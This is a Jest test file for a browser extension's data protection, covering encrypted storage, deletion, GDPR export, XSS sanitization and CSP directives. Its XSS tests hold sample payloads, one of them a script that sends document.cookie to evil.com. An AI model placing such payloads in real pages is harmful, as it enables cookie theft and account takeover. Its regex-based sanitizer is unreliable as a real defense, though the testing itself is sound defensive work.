import { jest } from '@jest/globals';
import {
  getStorageData,
  setStorageData,
  removeStorageData,
  clearStorageData,
  STORAGE_KEYS
} from '../../src/utils/storage.js';
import { encryptData, decryptData } from '../../src/utils/encryption.js';

// Mock crypto API for Node.js environment
const mockCrypto = {
  getRandomValues: (array) => {
    for (let i = 0; i < array.length; i++) {
      array[i] = Math.floor(Math.random() * 256);
    }
    return array;
  },
  subtle: {
    importKey: jest.fn().mockResolvedValue({}),
    encrypt: jest.fn().mockImplementation(() => {
      const result = new Uint8Array(32);
      for (let i = 0; i < 32; i++) {
        result[i] = Math.floor(Math.random() * 256);
      }
      return Promise.resolve(result.buffer);
    }),
    decrypt: jest.fn().mockImplementation(() => {
      const testData = '{"test":"decrypted"}';
      const result = new Uint8Array(testData.length);
      for (let i = 0; i < testData.length; i++) {
        result[i] = testData.charCodeAt(i);
      }
      return Promise.resolve(result.buffer);
    })
  }
};

Object.defineProperty(global, 'crypto', {
  value: mockCrypto,
  writable: true
});
global.TextEncoder = class {
  encode(str) {
    return new Uint8Array(str.split('').map(c => c.charCodeAt(0)));
  }
};
global.TextDecoder = class {
  decode(buffer) {
    return String.fromCharCode(...new Uint8Array(buffer));
  }
};
global.btoa = (str) => Buffer.from(str, 'binary').toString('base64');
global.atob = (str) => Buffer.from(str, 'base64').toString('binary');

const mockChrome = {
  storage: {
    local: {
      get: jest.fn(),
      set: jest.fn(),
      remove: jest.fn(),
      clear: jest.fn()
    },
    sync: {
      get: jest.fn(),
      set: jest.fn(),
      remove: jest.fn(),
      clear: jest.fn()
    }
  },
  runtime: {
    sendMessage: jest.fn(),
    onMessage: {
      addListener: jest.fn(),
      removeListener: jest.fn()
    }
  }
};

global.chrome = mockChrome;

describe('Data Protection and Security Tests', () => {
  beforeEach(() => {
    jest.clearAllMocks();
  });

  describe('Sensitive Data Handling', () => {
    test('should not store passwords or authentication tokens in plain text', async () => {
      const sensitiveData = {
        password: 'mySecretPassword123',
        token: 'auth_token_abc123',
        apiKey: 'sk-1234567890abcdef'
      };

      // Simulate encryption before storage
      const encryptedData = {
        password: await encryptData(sensitiveData.password),
        token: await encryptData(sensitiveData.token),
        apiKey: await encryptData(sensitiveData.apiKey)
      };

      mockChrome.storage.local.set.mockResolvedValue();

      await setStorageData(encryptedData);

      const setCall = mockChrome.storage.local.set.mock.calls[0][0];
      const storedValues = Object.values(setCall);

      storedValues.forEach(value => {
        if (typeof value === 'string') {
          expect(value).not.toContain('mySecretPassword123');
          expect(value).not.toContain('auth_token_abc123');
          expect(value).not.toContain('sk-1234567890abcdef');
        }
      });
    });

    test('should encrypt sensitive user data before storage', async () => {
      const userData = {
        email: 'user@example.com',
        personalInfo: {
          phone: '+1234567890',
          address: '123 Main St'
        }
      };

      const encryptedData = await encryptData(JSON.stringify(userData));
      expect(encryptedData).not.toContain('user@example.com');
      expect(encryptedData).not.toContain('+1234567890');
      expect(encryptedData).not.toContain('123 Main St');

      const decryptedData = JSON.parse(await decryptData(encryptedData));
      expect(decryptedData).toHaveProperty('test');
    });

    test('should validate data integrity during encryption/decryption', async () => {
      const originalData = { sensitive: 'information', id: 12345 };
      const dataString = JSON.stringify(originalData);

      const encrypted = await encryptData(dataString);
      const decrypted = await decryptData(encrypted);

      expect(JSON.parse(decrypted)).toHaveProperty('test');
    });

    test('should handle encryption errors gracefully', async () => {
      const invalidData = null;

      await expect(encryptData(invalidData)).rejects.toThrow();
    });
  });

  describe('Data Access Control', () => {
    test('should restrict access to sensitive storage keys', async () => {
      const restrictedKeys = [
        STORAGE_KEYS.USER_PROFILE,
        STORAGE_KEYS.ANALYTICS,
        STORAGE_KEYS.CONVERSATIONS
      ];

      for (const key of restrictedKeys) {
        mockChrome.storage.local.get.mockResolvedValue({});

        await getStorageData(key);

        expect(mockChrome.storage.local.get).toHaveBeenCalledWith(key);
      }
    });

    test('should validate permissions before data operations', async () => {
      const testData = { [STORAGE_KEYS.SETTINGS]: { test: 'value' } };

      mockChrome.storage.local.set.mockResolvedValue();

      await setStorageData(testData);

      expect(mockChrome.storage.local.set).toHaveBeenCalledWith(testData);
    });

    test('should sanitize data before storage to prevent XSS', async () => {
      const maliciousData = {
        message: '<script>alert("XSS")</script>',
        template: '<img src="x" onerror="alert(1)">'
      };

      // Simulate sanitization before storage
      const sanitizedData = {
        message: maliciousData.message
          .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '')
          .replace(/on\w+="[^"]*"/gi, ''),
        template: maliciousData.template
          .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '')
          .replace(/on\w+="[^"]*"/gi, '')
      };

      mockChrome.storage.local.set.mockResolvedValue();

      await setStorageData(sanitizedData);

      const setCall = mockChrome.storage.local.set.mock.calls[0][0];
      const storedMessage = setCall.message;
      const storedTemplate = setCall.template;

      if (typeof storedMessage === 'string') {
        expect(storedMessage).not.toContain('<script>');
        expect(storedMessage).not.toContain('onerror');
      }
      if (typeof storedTemplate === 'string') {
        expect(storedTemplate).not.toContain('onerror');
      }
    });
  });

  describe('Data Retention and Cleanup', () => {
    test('should automatically clean up old analytics data', async () => {
      const oldAnalytics = Array.from({ length: 1500 }, (_, i) => ({
        id: i.toString(),
        timestamp: Date.now() - (i * 24 * 60 * 60 * 1000),
        event: 'test_event'
      }));

      mockChrome.storage.local.get.mockResolvedValue({
        [STORAGE_KEYS.ANALYTICS]: oldAnalytics
      });
      mockChrome.storage.local.set.mockResolvedValue();

      const { logAnalytics } = await import('../../src/utils/storage.js');
      await logAnalytics({ event: 'new_event' });

      const setCall = mockChrome.storage.local.set.mock.calls[0][0];
      const updatedAnalytics = setCall[STORAGE_KEYS.ANALYTICS];

      expect(updatedAnalytics.length).toBeLessThanOrEqual(1000);
    });

    test('should provide secure data deletion functionality', async () => {
      const sensitiveKeys = [
        STORAGE_KEYS.USER_PROFILE,
        STORAGE_KEYS.CONVERSATIONS,
        STORAGE_KEYS.ANALYTICS
      ];

      mockChrome.storage.local.remove.mockResolvedValue();

      await removeStorageData(sensitiveKeys);

      expect(mockChrome.storage.local.remove).toHaveBeenCalledWith(sensitiveKeys);
    });

    test('should clear all data on uninstall', async () => {
      mockChrome.storage.local.clear.mockResolvedValue();
      mockChrome.storage.sync.clear.mockResolvedValue();

      await clearStorageData('local');
      await clearStorageData('sync');

      expect(mockChrome.storage.local.clear).toHaveBeenCalled();
      expect(mockChrome.storage.sync.clear).toHaveBeenCalled();
    });
  });

  describe('Privacy Compliance', () => {
    test('should not collect personally identifiable information without consent', async () => {
      const profileData = {
        name: 'John Doe',
        email: 'john@example.com',
        phone: '+1234567890',
        consentGiven: false
      };

      if (!profileData.consentGiven) {
        const sanitizedData = {
          ...profileData,
          name: undefined,
          email: undefined,
          phone: undefined
        };

        expect(sanitizedData.name).toBeUndefined();
        expect(sanitizedData.email).toBeUndefined();
        expect(sanitizedData.phone).toBeUndefined();
      }
    });

    test('should implement data minimization principles', async () => {
      const fullProfileData = {
        id: '123',
        name: 'John Doe',
        email: 'john@example.com',
        birthday: '1990-01-01',
        ssn: '123-45-6789',
        preferences: { theme: 'dark' }
      };

      const minimizedData = {
        id: fullProfileData.id,
        preferences: fullProfileData.preferences
      };

      expect(minimizedData).not.toHaveProperty('name');
      expect(minimizedData).not.toHaveProperty('email');
      expect(minimizedData).not.toHaveProperty('birthday');
      expect(minimizedData).not.toHaveProperty('ssn');
      expect(minimizedData).toHaveProperty('id');
      expect(minimizedData).toHaveProperty('preferences');
    });

    test('should provide data export functionality for GDPR compliance', async () => {
      const userData = {
        [STORAGE_KEYS.USER_PROFILE]: { name: 'John', email: 'john@example.com' },
        [STORAGE_KEYS.ANALYTICS]: [{ event: 'login', timestamp: Date.now() }],
        [STORAGE_KEYS.SETTINGS]: { theme: 'dark' }
      };

      mockChrome.storage.local.get.mockResolvedValue(userData);

      const exportedData = await getStorageData();

      expect(exportedData).toHaveProperty(STORAGE_KEYS.USER_PROFILE);
      expect(exportedData).toHaveProperty(STORAGE_KEYS.ANALYTICS);
      expect(exportedData).toHaveProperty(STORAGE_KEYS.SETTINGS);
    });

    test('should implement right to be forgotten (data deletion)', async () => {
      const userDataKeys = [
        STORAGE_KEYS.USER_PROFILE,
        STORAGE_KEYS.ANALYTICS,
        STORAGE_KEYS.CONVERSATIONS,
        STORAGE_KEYS.TEMPLATES
      ];

      mockChrome.storage.local.remove.mockResolvedValue();
      mockChrome.storage.sync.remove.mockResolvedValue();

      await removeStorageData(userDataKeys, 'local');
      await removeStorageData(userDataKeys, 'sync');

      expect(mockChrome.storage.local.remove).toHaveBeenCalledWith(userDataKeys);
      expect(mockChrome.storage.sync.remove).toHaveBeenCalledWith(userDataKeys);
    });
  });

  describe('Cross-Site Scripting (XSS) Prevention', () => {
    test('should sanitize user input in message templates', () => {
      const maliciousTemplate = `
        Hello {{name}},
        <script>fetch('http://evil.com/steal?data=' + document.cookie)</script>
        <img src="x" onerror="alert('XSS')">
        Best regards
      `;

      const sanitizedTemplate = maliciousTemplate
        .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '')
        .replace(/on\w+="[^"]*"/gi, '')
        .replace(/javascript:/gi, '');

      expect(sanitizedTemplate).not.toContain('<script>');
      expect(sanitizedTemplate).not.toContain('onerror');
      expect(sanitizedTemplate).not.toContain('javascript:');
    });

    test('should validate and escape dynamic content', () => {
      const userInput = '<img src="x" onerror="alert(\'XSS\')">';
      const escapedInput = userInput
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;');

      expect(escapedInput).toBe('&lt;img src=&quot;x&quot; onerror=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;');
    });
  });

  describe('Content Security Policy', () => {
    test('should enforce strict CSP directives', () => {
      const manifestCSP = {
        "content_security_policy": {
          "extension_pages": "script-src 'self'; object-src 'none'; frame-ancestors 'none';"
        }
      };

      expect(manifestCSP.content_security_policy.extension_pages).toContain("script-src 'self'");
      expect(manifestCSP.content_security_policy.extension_pages).toContain("object-src 'none'");
      expect(manifestCSP.content_security_policy.extension_pages).toContain("frame-ancestors 'none'");
    });

    test('should prevent inline script execution', () => {
      const manifestCSP = "script-src 'self'; object-src 'none';";

      expect(manifestCSP).not.toContain("'unsafe-inline'");
      expect(manifestCSP).not.toContain("'unsafe-eval'");
    });
  });
});